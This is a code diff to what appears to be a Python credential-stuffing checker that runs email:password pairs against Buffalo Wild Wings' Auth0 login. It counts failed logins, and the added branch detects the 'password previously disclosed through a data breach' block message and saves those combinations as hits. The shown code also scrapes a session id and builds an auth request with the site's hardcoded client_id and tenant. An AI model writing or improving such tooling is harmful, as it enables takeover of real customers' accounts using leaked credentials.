@@ -32,7 +32,12 @@ def check(email:str,password:str):
                 if "invalid_user_password" in r.text:
                     Checker.bad += 1
                     return
-                if "wresult" not in r.text:
+                elif "This login attempt has been blocked because the password you're using was previously disclosed through a data breach" in r.text:
+                    if not Checker.cui: log("custom",':'.join([email,password]),"BWW")
+                    save("Buffalo Wild Wings","custom",Checker.time,':'.join([email,password]))
+                    Checker.custom += 1
+                    return
+                elif "wresult" not in r.text:
                     raise
                 sid = r.text.split('sid&#34;:&#34;')[1].split('&#34;,&#34;realm')[0]
                 wc = quote(json.dumps({"strategy":"auth0","auth0Client":"eyJuYW1lIjoiYXV0aDAuanMtdWxwIiwidmVyc2lvbiI6IjkuMTYuNCJ9","tenant":"bww-prd01","connection":"firebase-auth","client_id":"mLLAi6nx8PX5OykSkTBG79aw5SkfIdKG","response_type":"code","scope":"openid offline_access","redirect_uri":"https://www.buffalowildwings.com/callback","state":state,"sid":sid,"realm":"firebase-auth"}))
